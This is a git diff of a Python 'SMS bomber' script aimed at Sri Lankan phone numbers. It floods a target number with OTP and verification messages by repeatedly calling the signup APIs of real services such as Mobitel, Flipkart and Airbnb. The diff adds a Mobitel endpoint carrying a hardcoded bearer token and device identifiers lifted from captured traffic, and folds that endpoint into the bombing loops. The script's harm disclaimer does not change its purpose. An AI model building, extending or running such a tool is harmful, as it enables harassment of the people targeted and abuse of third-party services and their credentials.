@@ -1,9 +1,9 @@
-#Script By Sandaru Ashen http://wa.me/16825007668
+#Script By Sandaru Ashen https://wa.me/16825007668
 import os,random,time,sys
 from urllib import request
 os.system('clear')
 fore=['\x1b[91m','\x1b[34m','\x1b[36m','\x1b[93m','\x1b[32m','\x1b[35m','\x1b[31m','\x1b[94m','\x1b[96m','\x1b[92m','\x1b[33m','\x1b[95m']
-logo=f'{random.choice(fore)}\x1b[1m\t\t   _________.__\n                  /   _____/|  |\n                  \\_____  \\ |  |\n                  /        \\|  |__\n                 /_______  /|____/\n   __________            \\/___.\n   \\______   \\ ____   _____\\_ |__   ___________\n    |    |  _//  _ \\ /     \\| __ \\_/ __ \\_  __ \\\n    |    |   (  <_> )  Y Y  \\ \\_\\ \\  ___/|  | \\/\n    |______  /\\____/|__|_|  /___  /\\___  >__|\n           \\/             \\/    \\/     \\/ {random.choice(fore)}v.1.1\n\t\t{random.choice(fore)}[+] By Sandaru Ashen'
+logo=f'{random.choice(fore)}\x1b[1m\t\t   _________.__\n                  /   _____/|  |\n                  \\_____  \\ |  |\n                  /        \\|  |__\n                 /_______  /|____/\n   __________            \\/___.\n   \\______   \\ ____   _____\\_ |__   ___________\n    |    |  _//  _ \\ /     \\| __ \\_/ __ \\_  __ \\\n    |    |   (  <_> )  Y Y  \\ \\_\\ \\  ___/|  | \\/\n    |______  /\\____/|__|_|  /___  /\\___  >__|\n           \\/             \\/    \\/     \\/ {random.choice(fore)}v.1.3\n\t\t{random.choice(fore)}[+] By Sandaru Ashen'
 bar=f'{random.choice(fore)}\x1b[1m_________________________{random.choice(fore)}_________________________\x1b[0m'
 print(bar+'\n')
 print(logo)
@@ -19,7 +19,7 @@ except ModuleNotFoundError:
 	os.system('pip3 install requests colorama')
 	print('\x1b[92m[+] Required Modules Installed!')
 	os.system('clear')
-	from requests import post
+	from requests import post,get
 	from colorama import Fore,init,Style
 	print(bar+'\n')
 	print(logo)
@@ -67,7 +67,6 @@ if cho==1:
 		time.sleep(0.3)
 		input(Fore.LIGHTRED_EX+Style.BRIGHT+'[!] Exiting...\nPress Enter To Continue...')
 		exit()
-	time.sleep(0.5)
 	while True:
 		try:
 			num=int(input(Style.BRIGHT+'Enter The Target No(07xxxxxxxx): '))
@@ -137,6 +136,12 @@ if cho==1:
 		num='94'+num
 		data=dict(phoneNumber=num,workFlow='GLOBAL_SIGNUP_LOGIN',otpMethod='AUTO')
 		poreq=post(url,params=params,headers=headers,json=data)
+		time.sleep(delay)
+	def mobself(num,delay):
+		url='https://mdp.mobitel.lk/mfp/api/adapters/SelfCareAdapter/account/addNumberToApp'
+		header={'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjRkZTNlODQ1LTAwMDctNDVkYy04ZjhhLWYzYzM5Y2QyMDE2YiIsIm4iOiJBTTBEZDd4QWR2NkgteWdMN3I4cUNMZEUtM0kya2s0NXpnWnREZF9xczhmdm5ZZmRpcVRTVjRfMnQ2T0dHOENWNUNlNDFQTXBJd21MNDEwWDlJWm52aHhvWWlGY01TYU9lSXFvZS1ySkEwdVp1dzJySGhYWjNXVkNlS2V6UlZjQ09Zc1FOLW1RSzBtZno1XzNvLWV2MFVZd1hrU093QkJsMUVocUl3VkR3T2llZzJKTUdsMEVYc1BaZmtOWkktSFU0b01paS1Uck5MelJXa01tTHZtMDloTDV6b3NVTkExNXZlQ0twaDJXcG1TbTJTNjFuRGhIN2dMRW95bURuVEVqUFk1QW9oMmluSS0zNlJHWVZNVVViTzQ2Q3JOVVl1SW9iT2lYbEx6QklodUlDcGZWZHhUX3g3c3RLWDVDOUJmTVRCNEdrT0hQNWNVdjdOejFkRGhJUHU4PSJ9fQ.eyJpc3MiOiJjb20uaWJtLm1mcCIsInN1YiI6IjRkZTNlODQ1LTAwMDctNDVkYy04ZjhhLWYzYzM5Y2QyMDE2YiIsImF1ZCI6ImNvbS5pYm0ubWZwIiwiZXhwIjoxNTk2MzQxMjUyNzY2LCJzY29wZSI6IlJlZ2lzdGVyZWRDbGllbnQgU2VsZkNhcmVTY29wZSJ9.s8wa0ga9uNVPyswtgsOhLnFUrEffSEOFuJ9X6uRPg-QSJKK16BI-QZA7yX6n1QDiSyssZmD_kczgIpGgeguQ2ulgi3r7ymxvf7QmAaXdDVXb2EVD_B7GZls1w8uZmrh6h07OkZIH6nEDDYapqcIEuJXPlNbUGUy5rgAnZcYSQ_-8PKMQoiYWG_RHeOaCmA5aiwEuqRWbIk-QO3x8BJ_rQ5DlnG20XOHttYnW2YgniQsWLr2dagM_Oe7CX7NMADjxxHh9XwTUkrqbtIqPZGnSVFb_sxkdvYWyoptDxGo4iamXfXmBi1ol0wDqm81CxmW-h9ql5QJzsQ2_WjIG8OZeRQ', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'mdp.mobitel.lk'}
+		data=f'params=%5B%7B%22device_type%22%3A%22desktop%22%2C%22appType%22%3A%22android%22%2C%22platformName%22%3A%22Android%22%2C%22user_id%22%3A%22-%22%2C%22testMode%22%3Afalse%2C%22trn_id%22%3A6%2C%22controller%22%3A%22account%22%2C%22action%22%3A%22addNumberToApp%22%2C%22platformVersion%22%3A%2210%22%2C%22device_version%22%3A%2210%22%2C%22device_manufacturer%22%3A%22HMD%20Global%22%2C%22deviceRef%22%3A%2204ff7be9ec7d63ba_381596262673267%22%2C%22device_id%22%3A%2204ff7be9ec7d63ba%22%2C%22device_platform%22%3A%2210%22%2C%22device_imsi%22%3A%2204ff7be9ec7d63ba%22%2C%22deviceModel%22%3A%22WSP_sprout%22%2C%22deviceToken%22%3A%22x2kmc48jb6g24147w817et6a19.769369435a%22%2C%22appVersion%22%3A%223.0.2%22%2C%22prePostType%22%3A%22%22%2C%22conn%22%3A%22%22%2C%22language%22%3A%22en%22%2C%22primaryConn%22%3A%22%22%2C%22user_type%22%3A%22%22%2C%22session_key%22%3A%22%22%2C%22package%22%3A%22%22%2C%22network_type%22%3A%22cellular%22%2C%22lob%22%3A%22%22%2C%22pushID%22%3A%22fv_AAyv6i9g%3AAPA91bFir7VaQDLBuSgSW8AQRZ8wVX78ZbGanuKIEDM0zrPhUrYiU62disk6k1jL242HQs6RPCLCmeIzNStQ30JZk7d7wGYVGZANWA74ceoui5d-PaeeNoFhnrzopSbQTs7EbaqjncfR%22%2C%22mobileNumber%22%3A%22{num}%22%7D%5D'
+		poreq=post(url,headers=header,data=data)
 		time.sleep(delay)
 	def flipkrt(num,delay):
 		url='https://rome.api.flipkart.net/1/action/view'
@@ -389,6 +394,10 @@ if cho==1:
 																	slmat(num,delay)
 																	count+=1
 																	prsent(count,num)
+																	if count< int(times):
+																		mobself(num,delay)
+																		count+=1
+																		prsent(count,num)
 		else:
 			while True:
 				dtamart(num,delay)
@@ -404,6 +413,9 @@ if cho==1:
 				count+=1
 				prsent(count,num)
 				kangaroo(num,delay)
+				count+=1
+				prsent(count,num)
+				mobself(num,delay)
 				count+=1
 				prsent(count,num)
 				airbnb(num,delay)
@@ -628,7 +640,7 @@ if cho==1:
 	print('\n'+bar+'\n')
 	ag=input(f'{Style.BRIGHT}{Fore.LIGHTGREEN_EX}\t[+] Bombing Successful\n\t{random.choice(fore)}[?] Run The Bomber Again?(y/n) ')
 	if ag == 'Y' or ag == 'y':
-		os.system('python slbomber.py')
+		os.system('python3 slbomber.py')
 	else:
 		exit()
 elif cho == 2:
@@ -636,8 +648,8 @@ elif cho == 2:
 	print(bar+'\n')
 	print(logo)
 	print(bar+'\n')
-	print(f'{Style.BRIGHT}\t\t\tAbout\n[+] Special Thanks To Packet Sniffing Software\n[+] If You Have Any Complains Or Future Requests Contact Me @ http://wa.me/16825007668\n[+] Never Use The Script To Cause Harm/Discomfort/Trouble To Others\n[!] If You Know More Websites And Apps That Use SMS Verification Please Inform Me')
+	print(f'{Style.BRIGHT}\t\t\tAbout\n{random.choice(fore)}[+] Special Thanks To Packet Sniffing Software\n{random.choice(fore)}[+] If You Have Any Complains Or Future Requests Contact Me @ http://wa.me/16825007668\n{random.choice(fore)}[+] Never Use The Script To Cause Harm/Discomfort/Trouble To Others\n{random.choice(fore)}[!] If You Know More Websites And Apps That Use SMS Verification Please Inform Me')
 	input(f'{Style.BRIGHT}{random.choice(fore)}\t[+] Press ENTER To Go Back To Main Menu')
-	os.system('python slbomber.py')
+	os.system('python3 slbomber.py')
 else:
 	exit()
